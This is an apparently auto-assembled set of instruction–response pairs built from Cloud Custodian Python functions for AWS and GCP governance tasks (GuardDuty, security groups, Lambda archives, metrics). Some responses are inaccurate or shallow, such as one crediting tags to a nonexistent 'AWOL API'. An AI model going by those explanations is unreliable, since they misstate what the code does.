{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndetermine the start and end dates based on user - supplied options.", "response": "def _metrics_get_endpoints(options):\n    \"\"\" Determine the start and end dates based on user-supplied options. \"\"\"\n    if bool(options.start) ^ bool(options.end):\n        log.error('--start and --end must be specified together')\n        sys.exit(1)\n\n    if options.start and options.end:\n        start = options.start\n        end = options.end\n    else:\n        end = datetime.utcnow()\n        start = end - timedelta(options.days)\n\n    return start, end"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nextracts an instance id from an error", "response": "def extract_instance_id(state_error):\n    \"Extract an instance id from an error\"\n    instance_id = None\n    match = RE_ERROR_INSTANCE_ID.search(str(state_error))\n    if match:\n        instance_id = match.groupdict().get('instance_id')\n    if match is None or instance_id is None:\n        raise ValueError(\"Could not extract instance id from error: %s\" % state_error)\n    return instance_id"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef augment(self, resources):\n        # First if we're in event based lambda go ahead and skip this,\n        # tags can't be trusted in ec2 instances immediately post creation.\n        if not resources or self.manager.data.get(\n                'mode', {}).get('type', '') in (\n                    'cloudtrail', 'ec2-instance-state'):\n            return resources\n\n        # AWOL detector, so we don't make extraneous api calls.\n        resource_count = len(resources)\n        search_count = min(int(resource_count % 0.05) + 1, 5)\n        if search_count > resource_count:\n            search_count = resource_count\n        found = False\n        for r in random.sample(resources, search_count):\n            if 'Tags' in r:\n                found = True\n                break\n\n        if found:\n            return resources\n\n        # Okay go and do the tag lookup\n        client = utils.local_session(self.manager.session_factory).client('ec2')\n        tag_set = self.manager.retry(\n            client.describe_tags,\n            Filters=[{'Name': 'resource-type',\n                      'Values': ['instance']}])['Tags']\n        resource_tags = {}\n        for t in tag_set:\n            t.pop('ResourceType')\n            rid = t.pop('ResourceId')\n            resource_tags.setdefault(rid, []).append(t)\n\n        m = self.manager.get_model()\n        for r in resources:\n            r['Tags'] = resource_tags.get(r[m.id], ())\n        return resources", "response": "Augment the resource list with the tags from AWS EC2 API and AWOL API."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef register_resources(klass, registry, resource_class):\n        for rtype, resource_manager in registry.items():\n            if not resource_manager.has_arn():\n                continue\n            if 'post-finding' in resource_manager.action_registry:\n                continue\n            resource_class.filter_registry.register('finding', klass)", "response": "register a new findings filter"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\npublish a message to a GCP pub / sub topic", "response": "def publish_message(self, message, client):\n        \"\"\"Publish message to a GCP pub/sub topic\n         \"\"\"\n        return client.execute_command('publish', {\n            'topic': self.data['transport']['topic'],\n            'body': {\n                'messages': {\n                    'data': self.pack(message)\n                }\n            }\n        })"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting headers on Mimetext message", "response": "def set_mimetext_headers(self, message, subject, from_addr, to_addrs, cc_addrs, priority):\n        \"\"\"Sets headers on Mimetext message\"\"\"\n\n        message['Subject'] = subject\n        message['From'] = from_addr\n        message['To'] = ', '.join(to_addrs)\n        if cc_addrs:\n            message['Cc'] = ', '.join(cc_addrs)\n\n        if priority and self.priority_header_is_valid(priority):\n            priority = PRIORITIES[str(priority)].copy()\n            for key in priority:\n                message[key] = priority[key]\n\n        return message"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef register_resources(klass, registry, resource_class):\n        services = {'acm-certificate', 'directconnect', 'dms-instance', 'directory', 'ec2',\n                    'dynamodb-table', 'cache-cluster', 'efs', 'app-elb', 'elb', 'emr', 'rds',\n                    'storage-gateway'}\n        if resource_class.type in services:\n            resource_class.filter_registry.register('health-event', klass)", "response": "register_resources registers a health - event filter to the resources."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef custodian_archive(packages=None):\n    modules = {'c7n', 'pkg_resources'}\n    if packages:\n        modules = filter(None, modules.union(packages))\n    return PythonPackageArchive(*sorted(modules))", "response": "Create a lambda code archive for running custodian."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds all. py files under the given directory path to the archive.", "response": "def add_directory(self, path, ignore=None):\n        \"\"\"Add ``*.py`` files under the directory ``path`` to the archive.\n        \"\"\"\n        for root, dirs, files in os.walk(path):\n            arc_prefix = os.path.relpath(root, os.path.dirname(path))\n            # py3 remove pyc cache dirs.\n            if '__pycache__' in dirs:\n                dirs.remove('__pycache__')\n            for f in files:\n                dest_path = os.path.join(arc_prefix, f)\n\n                # ignore specific files\n                if ignore and ignore(dest_path):\n                    continue\n\n                if f.endswith('.pyc') or f.endswith('.c'):\n                    continue\n                f_path = os.path.join(root, f)\n\n                self.add_file(f_path, dest_path)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_file(self, src, dest=None):\n        dest = dest or os.path.basename(src)\n        with open(src, 'rb') as fp:\n            contents = fp.read()\n        self.add_contents(dest, contents)", "response": "Add the file at src to the archive."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd contents to the archive under dest.", "response": "def add_contents(self, dest, contents):\n        \"\"\"Add file contents to the archive under ``dest``.\n\n        If ``dest`` is a path, it will be added compressed and world-readable\n        (user-writeable). You may also pass a :py:class:`~zipfile.ZipInfo` for\n        custom behavior.\n\n        \"\"\"\n        assert not self._closed, \"Archive closed\"\n        if not isinstance(dest, zipfile.ZipInfo):\n            dest = zinfo(dest)  # see for some caveats\n        # Ensure we apply the compression\n        dest.compress_type = self.zip_compression\n        # Mark host OS as Linux for all archives\n        dest.create_system = 3\n        self._zip_file.writestr(dest, contents)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef close(self):\n        self._closed = True\n        self._zip_file.close()\n        log.debug(\n            \"Created custodian serverless archive size: %0.2fmb\",\n            (os.path.getsize(self._temp_archive_file.name) / (\n                1024.0 * 1024.0)))\n        return self", "response": "Close the zip file and return the object."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_checksum(self, encoder=base64.b64encode, hasher=hashlib.sha256):\n        assert self._closed, \"Archive not closed\"\n        with open(self._temp_archive_file.name, 'rb') as fh:\n            return encoder(checksum(fh, hasher())).decode('ascii')", "response": "Return the b64 encoded sha256 checksum of the archive."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a read - only : py : class : ~zipfile. ZipFile object.", "response": "def get_reader(self):\n        \"\"\"Return a read-only :py:class:`~zipfile.ZipFile`.\"\"\"\n        assert self._closed, \"Archive not closed\"\n        buf = io.BytesIO(self.get_bytes())\n        return zipfile.ZipFile(buf, mode='r')"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\npublishes an alias for the given function.", "response": "def publish_alias(self, func_data, alias):\n        \"\"\"Create or update an alias for the given function.\n        \"\"\"\n        if not alias:\n            return func_data['FunctionArn']\n        func_name = func_data['FunctionName']\n        func_version = func_data['Version']\n\n        exists = resource_exists(\n            self.client.get_alias, FunctionName=func_name, Name=alias)\n\n        if not exists:\n            log.debug(\"Publishing custodian lambda alias %s\", alias)\n            alias_result = self.client.create_alias(\n                FunctionName=func_name,\n                Name=alias,\n                FunctionVersion=func_version)\n        else:\n            if (exists['FunctionVersion'] == func_version and\n                    exists['Name'] == alias):\n                return exists['AliasArn']\n            log.debug('Updating custodian lambda alias %s', alias)\n            alias_result = self.client.update_alias(\n                FunctionName=func_name,\n                Name=alias,\n                FunctionVersion=func_version)\n        return alias_result['AliasArn']"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef row_factory(cursor, row):\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d", "response": "Returns a sqlite row factory that returns a dictionary"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_tag_value(resource, tag, utf_8=False):\r\n\r\n        tags = {k.lower(): v for k, v in resource.get('tags', {}).items()}\r\n        value = tags.get(tag, False)\r\n\r\n        if value is not False:\r\n            if utf_8:\r\n                value = value.encode('utf8').decode('utf8')\r\n        return value", "response": "Get the resource s tag value."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef report(config, tags, accounts, master, debug, region):\n    accounts_config, master_info, executor = guardian_init(\n        config, debug, master, accounts, tags)\n\n    session = get_session(\n        master_info.get('role'), 'c7n-guardian',\n        master_info.get('profile'),\n        region)\n\n    client = session.client('guardduty')\n    detector_id = get_or_create_detector_id(client)\n\n    members = {m['AccountId']: m for m in\n               client.list_members(DetectorId=detector_id).get('Members')}\n\n    accounts_report = []\n    for a in accounts_config['accounts']:\n        ar = dict(a)\n        accounts_report.append(ar)\n        ar.pop('tags', None)\n        ar.pop('role')\n        ar.pop('regions', None)\n        if a['account_id'] not in members:\n            ar['member'] = False\n            ar['status'] = None\n            ar['invited'] = None\n            ar['updated'] = datetime.datetime.now().isoformat()\n            continue\n        m = members[a['account_id']]\n        ar['status'] = m['RelationshipStatus']\n        ar['member'] = True\n        ar['joined'] = m['InvitedAt']\n        ar['updated'] = m['UpdatedAt']\n\n    accounts_report.sort(key=operator.itemgetter('updated'), reverse=True)\n    print(tabulate(accounts_report, headers=('keys')))", "response": "report on guard duty enablement by account"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef disable(config, tags, accounts, master, debug,\n            suspend, disable_detector, delete_detector, dissociate, region):\n    \"\"\"suspend guard duty in the given accounts.\"\"\"\n    accounts_config, master_info, executor = guardian_init(\n        config, debug, master, accounts, tags)\n\n    if sum(map(int, (suspend, disable_detector, dissociate))) != 1:\n        raise ValueError((\n            \"One and only of suspend, disable-detector, dissociate\"\n            \"can be specified.\"))\n\n    master_session = get_session(\n        master_info['role'], 'c7n-guardian',\n        master_info.get('profile'), region)\n    master_client = master_session.client('guardduty')\n    detector_id = get_or_create_detector_id(master_client)\n\n    if suspend:\n        unprocessed = master_client.stop_monitoring_members(\n            DetectorId=detector_id,\n            AccountIds=[a['account_id'] for a in accounts_config['accounts']]\n        ).get('UnprocessedAccounts', ())\n\n        if unprocessed:\n            log.warning(\n                \"Following accounts where unprocessed\\n %s\",\n                format_event(unprocessed))\n        log.info(\"Stopped monitoring %d accounts in master\",\n                 len(accounts_config['accounts']))\n        return\n\n    if dissociate:\n        master_client.disassociate_members(\n            DetectorId=detector_id,\n            AccountIds=[a['account_id'] for a in accounts_config['accounts']])\n\n    # Seems like there's a couple of ways to disable an account\n    # delete the detector (member), disable the detector (master or member),\n    # or disassociate members, or from member disassociate from master.\n    for a in accounts_config['accounts']:\n        member_session = get_session(\n            a['role'], 'c7n-guardian',\n            a.get('profile'), region)\n\n        member_client = member_session.client('guardduty')\n        m_detector_id = get_or_create_detector_id(member_client)\n        if disable_detector:\n            member_client.update_detector(\n                DetectorId=m_detector_id, Enable=False)\n            log.info(\"Disabled detector in account:%s\", a['name'])\n        if dissociate:\n            try:\n                log.info(\"Disassociated member account:%s\", a['name'])\n                result = member_client.disassociate_from_master_account(\n                    DetectorId=m_detector_id)\n                log.info(\"Result %s\", format_event(result))\n            except ClientError as e:\n                if e.response['Error']['Code'] == 'InvalidInputException':\n                    continue\n        if delete_detector:\n            member_client.delete_detector(DetectorId=m_detector_id)\n            log.info(\"Deleted detector in account:%s\", a['name'])", "response": "Disable guard duty in the given accounts."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nenables guard duty on a set of accounts", "response": "def enable(config, master, tags, accounts, debug, message, region):\n    \"\"\"enable guard duty on a set of accounts\"\"\"\n    accounts_config, master_info, executor = guardian_init(\n        config, debug, master, accounts, tags)\n    regions = expand_regions(region)\n    for r in regions:\n        log.info(\"Processing Region:%s\", r)\n        enable_region(master_info, accounts_config, executor, message, r)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn all the security group names configured in this action.", "response": "def get_action_group_names(self):\n        \"\"\"Return all the security group names configured in this action.\"\"\"\n        return self.get_group_names(\n            list(itertools.chain(\n                *[self._get_array('add'),\n                  self._get_array('remove'),\n                  self._get_array('isolation-group')])))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_groups_by_names(self, names):\n        if not names:\n            return []\n        client = utils.local_session(\n            self.manager.session_factory).client('ec2')\n        sgs = self.manager.retry(\n            client.describe_security_groups,\n            Filters=[{\n                'Name': 'group-name', 'Values': names}]).get(\n                    'SecurityGroups', [])\n\n        unresolved = set(names)\n        for s in sgs:\n            if s['GroupName'] in unresolved:\n                unresolved.remove(s['GroupName'])\n\n        if unresolved:\n            raise PolicyExecutionError(self._format_error(\n                \"policy:{policy} security groups not found \"\n                \"requested: {names}, found: {groups}\",\n                names=list(unresolved), groups=[g['GroupId'] for g in sgs]))\n        return sgs", "response": "Resolve security names to security groups resources."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef resolve_group_names(self, r, target_group_ids, groups):\n        names = self.get_group_names(target_group_ids)\n        if not names:\n            return target_group_ids\n\n        target_group_ids = list(target_group_ids)\n        vpc_id = self.vpc_expr.search(r)\n        if not vpc_id:\n            raise PolicyExecutionError(self._format_error(\n                \"policy:{policy} non vpc attached resource used \"\n                \"with modify-security-group: {resource_id}\",\n                resource_id=r[self.manager.resource_type.id]))\n\n        found = False\n        for n in names:\n            for g in groups:\n                if g['GroupName'] == n and g['VpcId'] == vpc_id:\n                    found = g['GroupId']\n            if not found:\n                raise PolicyExecutionError(self._format_error((\n                    \"policy:{policy} could not resolve sg:{name} for \"\n                    \"resource:{resource_id} in vpc:{vpc}\"),\n                    name=n,\n                    resource_id=r[self.manager.resource_type.id], vpc=vpc_id))\n            target_group_ids.remove(n)\n            target_group_ids.append(found)\n        return target_group_ids", "response": "Resolve any security group names to the corresponding group ids\n            with the context of a given network attached resource."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nresolving the resource security groups that need be modified.", "response": "def resolve_remove_symbols(self, r, target_group_ids, rgroups):\n        \"\"\"Resolve the resources security groups that need be modified.\n\n        Specifically handles symbolic names that match annotations from policy filters\n        for groups being removed.\n        \"\"\"\n        if 'matched' in target_group_ids:\n            return r.get('c7n:matched-security-groups', ())\n        elif 'network-location' in target_group_ids:\n            for reason in r.get('c7n:NetworkLocation', ()):\n                if reason['reason'] == 'SecurityGroupMismatch':\n                    return list(reason['security-groups'])\n        elif 'all' in target_group_ids:\n            return rgroups\n        return target_group_ids"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_groups(self, resources):\n        resolved_groups = self.get_groups_by_names(self.get_action_group_names())\n        return_groups = []\n\n        for idx, r in enumerate(resources):\n            rgroups = self.sg_expr.search(r) or []\n            add_groups = self.resolve_group_names(\n                r, self._get_array('add'), resolved_groups)\n            remove_groups = self.resolve_remove_symbols(\n                r,\n                self.resolve_group_names(\n                    r, self._get_array('remove'), resolved_groups),\n                rgroups)\n            isolation_groups = self.resolve_group_names(\n                r, self._get_array('isolation-group'), resolved_groups)\n\n            for g in remove_groups:\n                if g in rgroups:\n                    rgroups.remove(g)\n            for g in add_groups:\n                if g not in rgroups:\n                    rgroups.append(g)\n\n            if not rgroups:\n                rgroups = list(isolation_groups)\n\n            return_groups.append(rgroups)\n\n        return return_groups", "response": "Returns a list of security groups that should be added to each resource."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef type_schema(\n        type_name, inherits=None, rinherit=None,\n        aliases=None, required=None, **props):\n    \"\"\"jsonschema generation helper\n\n    params:\n     - type_name: name of the type\n     - inherits: list of document fragments that are required via anyOf[$ref]\n     - rinherit: use another schema as a base for this, basically work around\n                 inherits issues with additionalProperties and type enums.\n     - aliases: additional names this type maybe called\n     - required: list of required properties, by default 'type' is required\n     - props: additional key value properties\n    \"\"\"\n    if aliases:\n        type_names = [type_name]\n        type_names.extend(aliases)\n    else:\n        type_names = [type_name]\n\n    if rinherit:\n        s = copy.deepcopy(rinherit)\n        s['properties']['type'] = {'enum': type_names}\n    else:\n        s = {\n            'type': 'object',\n            'properties': {\n                'type': {'enum': type_names}}}\n\n    # Ref based inheritance and additional properties don't mix well.\n    # https://stackoverflow.com/questions/22689900/json-schema-allof-with-additionalproperties\n    if not inherits:\n        s['additionalProperties'] = False\n\n    s['properties'].update(props)\n    if not required:\n        required = []\n    if isinstance(required, list):\n        required.append('type')\n    s['required'] = required\n    if inherits:\n        extended = s\n        s = {'allOf': [{'$ref': i} for i in inherits]}\n        s['allOf'].append(extended)\n    return s", "response": "generate a jsonschema for a type"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef group_by(resources, key):\n    resource_map = {}\n    parts = key.split('.')\n    for r in resources:\n        v = r\n        for k in parts:\n            v = v.get(k)\n            if not isinstance(v, dict):\n                break\n        resource_map.setdefault(v, []).append(r)\n    return resource_map", "response": "Return a mapping of key value to resources with the corresponding value."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nqueries EC2 instances for the query.", "response": "def query_instances(session, client=None, **query):\n    \"\"\"Return a list of ec2 instances for the query.\n    \"\"\"\n    if client is None:\n        client = session.client('ec2')\n    p = client.get_paginator('describe_instances')\n    results = p.paginate(**query)\n    return list(itertools.chain(\n        *[r[\"Instances\"] for r in itertools.chain(\n            *[pp['Reservations'] for pp in results])]))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncaches a session thread local for up to 45m", "response": "def local_session(factory):\n    \"\"\"Cache a session thread local for up to 45m\"\"\"\n    factory_region = getattr(factory, 'region', 'global')\n    s = getattr(CONN_CACHE, factory_region, {}).get('session')\n    t = getattr(CONN_CACHE, factory_region, {}).get('time')\n\n    n = time.time()\n    if s is not None and t + (60 * 45) > n:\n        return s\n    s = factory()\n\n    setattr(CONN_CACHE, factory_region, {'session': s, 'time': n})\n    return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_annotation(i, k, v):\n    if not isinstance(i, dict):\n        raise ValueError(\"Can only annotate dictionaries\")\n\n    if not isinstance(v, list):\n        v = [v]\n\n    if k in i:\n        ev = i.get(k)\n        if isinstance(ev, list):\n            ev.extend(v)\n    else:\n        i[k] = v", "response": "Set the annotation of a single object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef generate_arn(\n        service, resource, partition='aws',\n        region=None, account_id=None, resource_type=None, separator='/'):\n    \"\"\"Generate an Amazon Resource Name.\n    See http://docs.aws.amazon.com/general/latest/gr/aws-arns-and-namespaces.html.\n    \"\"\"\n    if region and region in REGION_PARTITION_MAP:\n        partition = REGION_PARTITION_MAP[region]\n    if service == 's3':\n        region = ''\n    arn = 'arn:%s:%s:%s:%s:' % (\n        partition, service, region if region else '', account_id if account_id else '')\n    if resource_type:\n        arn = arn + '%s%s%s' % (resource_type, separator, resource)\n    else:\n        arn = arn + resource\n    return arn", "response": "Generate an Amazon Resource Name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn an identifier for a snapshot of a database or cluster.", "response": "def snapshot_identifier(prefix, db_identifier):\n    \"\"\"Return an identifier for a snapshot of a database or cluster.\n    \"\"\"\n    now = datetime.now()\n    return '%s-%s-%s' % (prefix, db_identifier, now.strftime('%Y-%m-%d-%H-%M'))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreformats schema to be in a more displayable format.", "response": "def reformat_schema(model):\n    \"\"\" Reformat schema to be in a more displayable format. \"\"\"\n    if not hasattr(model, 'schema'):\n        return \"Model '{}' does not have a schema\".format(model)\n\n    if 'properties' not in model.schema:\n        return \"Schema in unexpected format.\"\n\n    ret = copy.deepcopy(model.schema['properties'])\n\n    if 'type' in ret:\n        del(ret['type'])\n\n    for key in model.schema.get('required', []):\n        if key in ret:\n            ret[key]['required'] = True\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nformatting all string values in an object.", "response": "def format_string_values(obj, err_fallback=(IndexError, KeyError), *args, **kwargs):\n    \"\"\"\n    Format all string values in an object.\n    Return the updated object\n    \"\"\"\n    if isinstance(obj, dict):\n        new = {}\n        for key in obj.keys():\n            new[key] = format_string_values(obj[key], *args, **kwargs)\n        return new\n    elif isinstance(obj, list):\n        new = []\n        for item in obj:\n            new.append(format_string_values(item, *args, **kwargs))\n        return new\n    elif isinstance(obj, six.string_types):\n        try:\n            return obj.format(*args, **kwargs)\n        except err_fallback:\n            return obj\n    else:\n        return obj"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_resources(self, ids, cache=True):\n        client = local_session(self.manager.session_factory).client('dax')\n        return client.describe_clusters(ClusterNames=ids).get('Clusters')", "response": "Retrieve dax resources for serverless policies or related resources"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates a c7n - org gcp projects config file", "response": "def main(output):\n    \"\"\"\n    Generate a c7n-org gcp projects config file\n    \"\"\"\n\n    client = Session().client('cloudresourcemanager', 'v1', 'projects')\n\n    results = []\n    for page in client.execute_paged_query('list', {}):\n        for project in page.get('projects', []):\n\n            if project['lifecycleState'] != 'ACTIVE':\n                continue\n\n            project_info = {\n                'project_id': project['projectId'],\n                'name': project['name'],\n            }\n\n            if 'labels' in project:\n                project_info['tags'] = [\n                    'label:%s:%s' % (k, v) for k, v in project.get('labels', {}).items()]\n            results.append(project_info)\n\n    output.write(\n        yaml.safe_dump({'projects': results}, default_flow_style=False))"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nquery a set of resources.", "response": "def filter(self, resource_manager, **params):\n        \"\"\"Query a set of resources.\"\"\"\n        m = self.resolve(resource_manager.resource_type)\n        client = resource_manager.get_client()\n\n        enum_op, list_op, extra_args = m.enum_spec\n\n        parent_type, annotate_parent = m.parent_spec\n        parents = self.manager.get_resource_manager(parent_type)\n\n        # Have to query separately for each parent's children.\n        results = []\n        for parent in parents.resources():\n            if extra_args:\n                params.update({key: parent[extra_args[key]] for key in extra_args.keys()})\n\n            op = getattr(getattr(client, enum_op), list_op)\n            subset = [r.serialize(True) for r in op(**params)]\n\n            if annotate_parent:\n                for r in subset:\n                    r[self.parent_key] = parent[parents.resource_type.id]\n\n            if subset:\n                results.extend(subset)\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_attr_filters(self):\n        for f in self.data.keys():\n            if f not in self.multi_attrs:\n                continue\n            fv = self.data[f]\n            if isinstance(fv, dict):\n                fv['key'] = f\n            else:\n                fv = {f: fv}\n            vf = ValueFilter(fv)\n            vf.annotate = False\n            yield vf", "response": "Return an iterator over resource attribute filters configured."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd CloudTrail permissions to an S3 policy preserving existing", "response": "def cloudtrail_policy(original, bucket_name, account_id, bucket_region):\n    '''add CloudTrail permissions to an S3 policy, preserving existing'''\n    ct_actions = [\n        {\n            'Action': 's3:GetBucketAcl',\n            'Effect': 'Allow',\n            'Principal': {'Service': 'cloudtrail.amazonaws.com'},\n            'Resource': generate_arn(\n                service='s3', resource=bucket_name, region=bucket_region),\n            'Sid': 'AWSCloudTrailAclCheck20150319',\n        },\n        {\n            'Action': 's3:PutObject',\n            'Condition': {\n                'StringEquals':\n                {'s3:x-amz-acl': 'bucket-owner-full-control'},\n            },\n            'Effect': 'Allow',\n            'Principal': {'Service': 'cloudtrail.amazonaws.com'},\n            'Resource': generate_arn(\n                service='s3', resource=bucket_name, region=bucket_region),\n            'Sid': 'AWSCloudTrailWrite20150319',\n        },\n    ]\n    # parse original policy\n    if original is None:\n        policy = {\n            'Statement': [],\n            'Version': '2012-10-17',\n        }\n    else:\n        policy = json.loads(original['Policy'])\n    original_actions = [a.get('Action') for a in policy['Statement']]\n    for cta in ct_actions:\n        if cta['Action'] not in original_actions:\n            policy['Statement'].append(cta)\n    return json.dumps(policy)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_available_engine_upgrades(client, major=False):\n    results = {}\n    engine_versions = client.describe_db_engine_versions()['DBEngineVersions']\n    for v in engine_versions:\n        if not v['Engine'] in results:\n            results[v['Engine']] = {}\n        if 'ValidUpgradeTarget' not in v or len(v['ValidUpgradeTarget']) == 0:\n            continue\n        for t in v['ValidUpgradeTarget']:\n            if not major and t['IsMajorVersionUpgrade']:\n                continue\n            if LooseVersion(t['EngineVersion']) > LooseVersion(\n                    results[v['Engine']].get(v['EngineVersion'], '0.0.0')):\n                results[v['Engine']][v['EngineVersion']] = t['EngineVersion']\n    return results", "response": "Returns all available rds engine upgrades."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_local_output_dir():\n    output_dir = os.environ.get('C7N_OUTPUT_DIR', '/tmp/' + str(uuid.uuid4()))\n    if not os.path.exists(output_dir):\n        try:\n            os.mkdir(output_dir)\n        except OSError as error:\n            log.warning(\"Unable to make output directory: {}\".format(error))\n    return output_dir", "response": "Create a local output directory per execution."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ninitialize the policy lambda execution configuration.", "response": "def init_config(policy_config):\n    \"\"\"Get policy lambda execution configuration.\n\n    cli parameters are serialized into the policy lambda config,\n    we merge those with any policy specific execution options.\n\n    --assume role and -s output directory get special handling, as\n    to disambiguate any cli context.\n\n    account id is sourced from the config options or from api call\n    and cached as a global\n    \"\"\"\n    global account_id\n\n    exec_options = policy_config.get('execution-options', {})\n\n    # Remove some configuration options that don't make sense to translate from\n    # cli to lambda automatically.\n    #  - assume role on cli doesn't translate, it is the default lambda role and\n    #    used to provision the lambda.\n    #  - profile doesnt translate to lambda its `home` dir setup dependent\n    #  - dryrun doesn't translate (and shouldn't be present)\n    #  - region doesn't translate from cli (the lambda is bound to a region), and\n    #    on the cli represents the region the lambda is provisioned in.\n    for k in ('assume_role', 'profile', 'region', 'dryrun', 'cache'):\n        exec_options.pop(k, None)\n\n    # a cli local directory doesn't translate to lambda\n    if not exec_options.get('output_dir', '').startswith('s3'):\n        exec_options['output_dir'] = get_local_output_dir()\n\n    # we can source account id from the cli parameters to avoid the sts call\n    if exec_options.get('account_id'):\n        account_id = exec_options['account_id']\n\n    # merge with policy specific configuration\n    exec_options.update(\n        policy_config['policies'][0].get('mode', {}).get('execution-options', {}))\n\n    # if using assume role in lambda ensure that the correct\n    # execution account is captured in options.\n    if 'assume_role' in exec_options:\n        account_id = exec_options['assume_role'].split(':')[4]\n    elif account_id is None:\n        session = boto3.Session()\n        account_id = get_account_id_from_sts(session)\n    exec_options['account_id'] = account_id\n\n    # Historical compatibility with manually set execution options\n    # previously this was a boolean, its now a string value with the\n    # boolean flag triggering a string value of 'aws'\n    if 'metrics_enabled' in exec_options \\\n       and isinstance(exec_options['metrics_enabled'], bool) \\\n       and exec_options['metrics_enabled']:\n        exec_options['metrics_enabled'] = 'aws'\n\n    return Config.empty(**exec_options)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nindexing policy metrics in a given time range", "response": "def index_metrics(\n        config, start, end, incremental=False, concurrency=5, accounts=None,\n        period=3600, tag=None, index='policy-metrics', verbose=False):\n    \"\"\"index policy metrics\"\"\"\n    logging.basicConfig(level=(verbose and logging.DEBUG or logging.INFO))\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n    logging.getLogger('elasticsearch').setLevel(logging.WARNING)\n    logging.getLogger('urllib3').setLevel(logging.WARNING)\n    logging.getLogger('requests').setLevel(logging.WARNING)\n    logging.getLogger('c7n.worker').setLevel(logging.INFO)\n\n    with open(config) as fh:\n        config = yaml.safe_load(fh.read())\n    jsonschema.validate(config, CONFIG_SCHEMA)\n\n    start, end = get_date_range(start, end)\n\n    p_accounts = set()\n    p_account_stats = {}\n    i_time = i_points = 0\n    t = time.time()\n\n    with ProcessPoolExecutor(max_workers=concurrency) as w:\n        futures = {}\n        jobs = []\n        # Filter\n        for account in config.get('accounts'):\n            if accounts and account['name'] not in accounts:\n                continue\n            if tag:\n                found = False\n                for t in account['tags'].values():\n                    if tag == t:\n                        found = True\n                        break\n                if not found:\n                    continue\n            p_accounts.add((account['name']))\n            for region in account.get('regions'):\n                for (p_start, p_end) in get_periods(start, end, period):\n                    p = (config, index, region, account, p_start, p_end, period)\n                    jobs.append(p)\n\n        # by default we'll be effectively processing in order, but thats bumps\n        # our concurrency into rate limits on metrics retrieval in a given account\n        # region, go ahead and shuffle, at least with lucene, the non ordering\n        # should have minimal impact on query perf (inverted index).\n\n        random.shuffle(jobs)\n\n        for j in jobs:\n            log.debug(\"submit account:%s region:%s start:%s end:%s\" % (\n                j[3]['name'], j[2], j[4], j[5]))\n            futures[w.submit(index_account_metrics, *j)] = j\n\n        # Process completed\n        for f in as_completed(futures):\n            config, index, region, account, p_start, p_end, period = futures[f]\n            if f.exception():\n                log.warning(\"error account:%s region:%s error:%s\",\n                            account['name'], region, f.exception())\n                continue\n            rtime, rpoints = f.result()\n            rstat = p_account_stats.setdefault(\n                account['name'], {}).setdefault(region, {'points': 0})\n            rstat['points'] += rpoints\n\n            # log.info(\"complete account:%s, region:%s points:%s time:%0.2f\",\n            #         account['name'], region, rpoints, rtime)\n\n            i_time += rtime\n            i_points += rpoints\n\n        log.info(\"complete accounts:%d points:%d itime:%0.2f time:%0.2f\",\n                 len(p_accounts), i_points, i_time, time.time() - t)"}
